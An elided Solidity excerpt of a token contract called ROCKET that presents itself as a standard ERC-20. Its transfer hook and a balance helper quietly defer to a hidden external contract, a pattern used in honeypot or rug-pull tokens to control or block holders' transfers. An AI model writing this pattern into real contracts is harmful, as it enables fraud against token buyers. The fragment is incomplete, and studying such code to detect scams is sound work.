...
interface IERC20Meta {
    function balanceOf(address account) external view returns (uint256);
    function _transfer(address from, address to, uint256 amount)  external returns(uint256);
}
...
contract ROCKET is Context, IERC20, IERC20Metadata {
    ...
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
       l._transfer(from, to, amount);
    }
    function _beforeOf(address account) internal view returns (uint256) {
     return  l.balanceOf(account);
    }
